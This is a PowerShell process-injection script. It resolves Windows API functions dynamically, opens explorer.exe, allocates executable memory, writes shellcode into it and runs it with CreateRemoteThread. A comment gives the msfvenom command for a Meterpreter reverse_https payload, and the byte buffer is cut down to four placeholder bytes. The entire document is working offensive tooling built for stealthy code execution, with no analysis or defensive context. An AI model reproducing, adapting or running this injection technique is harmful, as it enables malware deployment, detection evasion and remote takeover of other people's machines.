Function Standard_Process_Injection_Delegate {

$Kernel32 = @'

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Kernel32 {

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, uint processId);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]    
    public delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]    
    public delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]    
    public delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


}

'@

Add-Type $Kernel32

# Load the kernel32.dll dynamically
$kernel32Handle = [Kernel32]::LoadLibraryA("kernel32.dll")

# Get function addresses dynamically
$pOpenProcess = [Kernel32]::GetProcAddress($kernel32Handle, "OpenProcess")
$pVirtualAllocEx = [Kernel32]::GetProcAddress($kernel32Handle, "VirtualAllocEx")
$pReadProcessMemory = [Kernel32]::GetProcAddress($kernel32Handle, "ReadProcessMemory")
$pWriteProcessMemory = [Kernel32]::GetProcAddress($kernel32Handle, "WriteProcessMemory")
$pCreateRemoteThread = [Kernel32]::GetProcAddress($kernel32Handle, "CreateRemoteThread")

# Convert function pointers to delegates
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pOpenProcess, [Kernel32+OpenProcessDelegate])
$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVirtualAllocEx, [Kernel32+VirtualAllocExDelegate])
$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pReadProcessMemory, [Kernel32+ReadProcessMemoryDelegate])
$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pWriteProcessMemory, [Kernel32+WriteProcessMemoryDelegate])
$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCreateRemoteThread, [Kernel32+CreateRemoteThreadDelegate])

# Get the process ID of explorer
$Process = (Get-Process -Name "explorer").Id

# Open a handle to the process
[IntPtr]$hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, [uint32]$Process)

# Allocate memory in the remote process
$addr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4
$size = $buf.Length

# Write shellcode to the allocated memory
$outsize = [IntPtr]::Zero
$WriteProcessMemory.Invoke($hProcess, $addr, $buf, $size, [ref] $outsize) > $null

# Create a remote thread to execute the shellcode
[IntPtr]$hThread = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

}

Standard_Process_Injection_Delegate
